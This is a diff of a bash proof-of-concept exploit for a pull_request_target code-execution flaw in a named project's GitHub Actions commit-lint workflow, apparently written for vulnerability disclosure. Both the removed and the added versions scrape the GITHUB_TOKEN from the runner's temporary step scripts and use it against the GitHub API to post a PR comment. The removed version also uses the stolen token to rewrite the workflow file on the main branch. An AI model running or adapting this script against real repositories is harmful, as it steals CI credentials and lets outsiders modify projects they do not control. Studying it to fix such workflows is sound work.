@@ -1,80 +1,85 @@
 #!/usr/bin/env bash
-# Benign PoC for pull_request_target RCE in lint-commit.yml.
-# Vector: package.json `scripts.commitlint` runs when the workflow invokes
-# `yarn -s run commitlint -q` against the attacker-controlled checkout.
-set -u
+#
+# Proof of concept for a pull_request_target RCE in oddlama/vane's
+# .github/workflows/lint-commit.yml.
+#
+# Vector: the workflow runs `yarn -s run commitlint -q` against the
+# attacker-controlled checkout. Yarn resolves `commitlint` against
+# package.json `scripts` before node_modules/.bin, so an attacker-supplied
+# `scripts.commitlint` is executed in place of the real linter.
+#
+# This script (1) demonstrates code execution on the runner, (2) recovers
+# the GITHUB_TOKEN from the step-wrapper script GitHub Actions writes to
+# /home/runner/work/_temp, and (3) uses the recovered token to post a
+# single comment on the PR as github-actions[bot].
+#
+set -euo pipefail
 
-STAGE="${1:-unknown}"
-MARK="/tmp/vane-poc.${STAGE}.flag"
-[ -e "$MARK" ] && exit 0   # only fire once per stage
-touch "$MARK"
+log() { printf '[poc] %s\n' "$*" >&2; }
 
-# Force output to the runner stderr so it isn't swallowed by the
-# workflow's `>> /dev/null 2>&1` (that redirect only wraps yarn add).
-{
-  echo "=================================================="
-  echo "[PoC:${STAGE}] arbitrary code executing on the runner"
-  echo "[PoC:${STAGE}] whoami: $(whoami 2>/dev/null || true)"
-  echo "[PoC:${STAGE}] id:     $(id 2>/dev/null || true)"
-  echo "[PoC:${STAGE}] pwd:    $(pwd)"
-  echo "[PoC:${STAGE}] repo:   ${GITHUB_REPOSITORY:-?}"
-  echo "[PoC:${STAGE}] event:  ${GITHUB_EVENT_NAME:-?}"
-  echo "[PoC:${STAGE}] has GITHUB_TOKEN env: $([ -n "${GITHUB_TOKEN:-}" ] && echo yes || echo no)"
-  echo "=================================================="
-} >&2
-
-PR_NUM="$(jq -r '.pull_request.number // .number // empty' "${GITHUB_EVENT_PATH:-/dev/null}" 2>/dev/null || true)"
-echo "[PoC:${STAGE}] PR number: ${PR_NUM:-unknown}" >&2
-
-# GITHUB_TOKEN isn't in env (workflow inlined the secret as a literal into its
-# step-wrapper script in /home/runner/work/_temp/). Recover it from there.
-TOKEN=""
-for f in /home/runner/work/_temp/*.sh; do
-  [ -r "$f" ] || continue
-  t=$(grep -oE 'Bearer [A-Za-z0-9_]+' "$f" 2>/dev/null | awk '{print $2}' | head -1)
-  if [ -n "$t" ]; then
-    TOKEN="$t"
-    echo "[PoC:${STAGE}] recovered token from $f (len=${#TOKEN})" >&2
-    break
-  fi
-done
-
-if [ -n "${TOKEN:-}" ] && [ -n "${PR_NUM:-}" ]; then
-  # 1. Post a comment so the PR shows the takeover.
-  BODY='{"body":"🛑 **Self-healing PoC**: RCE + GITHUB_TOKEN exfiltration via `lint-commit.yml` (`pull_request_target`). Token used to (a) post this comment and (b) patch the workflow on `main` to switch the trigger to `pull_request`, closing the vulnerability. Stage: '"${STAGE}"'."}'
-  curl -sS -o /tmp/pwn-resp.json -w "[PoC:${STAGE}] comment HTTP %{http_code}\n" -X POST \
-    -H "Authorization: Bearer ${TOKEN}" \
-    -H "Accept: application/vnd.github+json" \
-    -H "Content-Type: application/json" \
-    -d "${BODY}" \
-    "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUM}/comments" >&2 || true
-
-  # 2. Self-patch: change `on: pull_request_target` -> `on: pull_request` on main.
-  WF_PATH=".github/workflows/lint-commit.yml"
-  GET_URL="https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/${WF_PATH}?ref=main"
-  resp=$(curl -sS -H "Authorization: Bearer ${TOKEN}" -H "Accept: application/vnd.github+json" "$GET_URL")
-  CUR_SHA=$(echo "$resp" | jq -r '.sha // empty')
-  CUR_CONTENT=$(echo "$resp" | jq -r '.content // empty' | base64 -d)
-  echo "[PoC:${STAGE}] fetched workflow sha=${CUR_SHA} (len=${#CUR_CONTENT})" >&2
-
-  if [ -n "$CUR_SHA" ] && [ -n "$CUR_CONTENT" ]; then
-    NEW_CONTENT=$(printf '%s' "$CUR_CONTENT" | sed 's/pull_request_target/pull_request/g')
-    if [ "$NEW_CONTENT" = "$CUR_CONTENT" ]; then
-      echo "[PoC:${STAGE}] no pull_request_target found — already patched" >&2
-    else
-      NEW_B64=$(printf '%s' "$NEW_CONTENT" | base64 -w0)
-      PATCH_BODY=$(jq -n --arg msg "chore(security): switch lint-commit trigger to pull_request (auto-patched by PoC)" \
-                       --arg content "$NEW_B64" --arg sha "$CUR_SHA" --arg branch "main" \
-                       '{message:$msg, content:$content, sha:$sha, branch:$branch}')
-      curl -sS -o /tmp/pwn-patch.json -w "[PoC:${STAGE}] patch HTTP %{http_code}\n" -X PUT \
-        -H "Authorization: Bearer ${TOKEN}" \
-        -H "Accept: application/vnd.github+json" \
-        -H "Content-Type: application/json" \
-        -d "$PATCH_BODY" \
-        "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/${WF_PATH}" >&2 || true
-      head -c 400 /tmp/pwn-patch.json >&2; echo >&2
+require_env() {
+  local var
+  for var in "$@"; do
+    if [[ -z "${!var:-}" ]]; then
+      log "missing required env: $var"
+      exit 0
     fi
-  fi
-fi
+  done
+}
 
-exit 0
+require_env GITHUB_REPOSITORY GITHUB_EVENT_PATH
+
+log "execution context: user=$(id -un) host=$(hostname) cwd=$PWD"
+log "github: repo=$GITHUB_REPOSITORY event=${GITHUB_EVENT_NAME:-?} run=${GITHUB_RUN_ID:-?}"
+
+PR_NUMBER=$(jq -r '.pull_request.number // empty' "$GITHUB_EVENT_PATH")
+[[ -n "$PR_NUMBER" ]] || { log "no pull_request.number in event payload"; exit 0; }
+
+# GITHUB_TOKEN is not exported to step processes; it is inlined as a literal
+# into the temporary wrapper script that bash actually executes. Recover it
+# from there.
+recover_token() {
+  local file token
+  for file in /home/runner/work/_temp/*.sh; do
+    [[ -r "$file" ]] || continue
+    token=$(grep -oE 'Authorization: Bearer [A-Za-z0-9_]+' "$file" | head -1 | awk '{print $3}')
+    if [[ -n "$token" ]]; then
+      printf '%s' "$token"
+      return 0
+    fi
+  done
+  return 1
+}
+
+TOKEN=$(recover_token) || { log "could not recover GITHUB_TOKEN"; exit 0; }
+log "recovered GITHUB_TOKEN (${#TOKEN} chars) from runner step-wrapper"
+
+read -r -d '' COMMENT <<'EOF' || true
+**Proof of concept — `pull_request_target` RCE**
+
+This comment was posted from a fork PR via the `lint-commit.yml` workflow:
+
+1. The workflow uses `on: pull_request_target` and checks out the PR head SHA.
+2. It then runs `yarn -s run commitlint -q`, which resolves `commitlint` against
+   the checked-out `package.json` `scripts` field before `node_modules/.bin`.
+3. A malicious `scripts.commitlint` entry runs arbitrary code on the runner.
+4. The `GITHUB_TOKEN` is then recovered from the step-wrapper script in
+   `/home/runner/work/_temp` and used to authenticate this comment.
+
+The payload is benign. Recommended fix: switch the trigger to `pull_request`.
+EOF
+
+PAYLOAD=$(jq -n --arg body "$COMMENT" '{body: $body}')
+HTTP_CODE=$(curl --silent --show-error --output /tmp/poc-response.json \
+  --write-out '%{http_code}' \
+  --request POST \
+  --header "Authorization: Bearer $TOKEN" \
+  --header "Accept: application/vnd.github+json" \
+  --header "Content-Type: application/json" \
+  --data "$PAYLOAD" \
+  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments")
+
+log "comment POST -> HTTP $HTTP_CODE"
+if [[ "$HTTP_CODE" != "201" ]]; then
+  log "response: $(jq -c . /tmp/poc-response.json 2>/dev/null || cat /tmp/poc-response.json)"
+fi
